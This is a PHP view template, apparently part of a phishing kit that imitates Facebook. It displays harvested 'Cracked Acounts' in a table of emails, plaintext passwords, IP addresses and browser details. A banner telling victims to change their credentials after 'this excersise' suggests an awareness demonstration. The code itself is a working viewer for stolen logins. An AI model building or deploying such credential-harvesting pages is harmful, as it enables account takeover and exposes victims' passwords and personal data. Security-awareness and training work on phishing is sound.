<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Facebook</title>
	<link rel="stylesheet" type="text/css" href="<?= base_url('assets/style.css') ?>">
	<!-- Bootstrap 5 -->
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
	<link rel="icon" type="image/x-icon" href="<?= base_url('assets/favicon.ico') ?>">
</head>
<body style="background-image: url(<?= base_url('assets/cracked.png') ?>);">
	<div class="container">
		<?php if (! empty($fields) && is_array($fields)) :  ?>
		<h3 class="text-white">
			Cracked Acounts. Please proceed to change your facebook credentials shortly after this excersise
		</h3>
		<hr>
		<div class="table-responsive">
			<table class="table table-bordered text-white">
				<thead>
					<tr>
						<th>Email</th>
						<th>Password</th>
						<th>IP Address</th>
						<th>Platform</th>
					</tr>
				</thead>
				<tbody>
					<?php foreach($fields as $field) : ?>
					<tr>
						<td><?= $field['email'] ?></td>
						<td><?= $field['password'] ?></td>
						<td><?= $field['ip_address'] ?></td>
						<td><?= $field['user_agent'] ?></td>
					</tr>
					<?php endforeach; ?>
				</tbody>
			</table>
		</div>
		<?php else: ?>
			<p>Table is currently empty</p>
		<?php endif; ?>
	</div>
</body>
</html>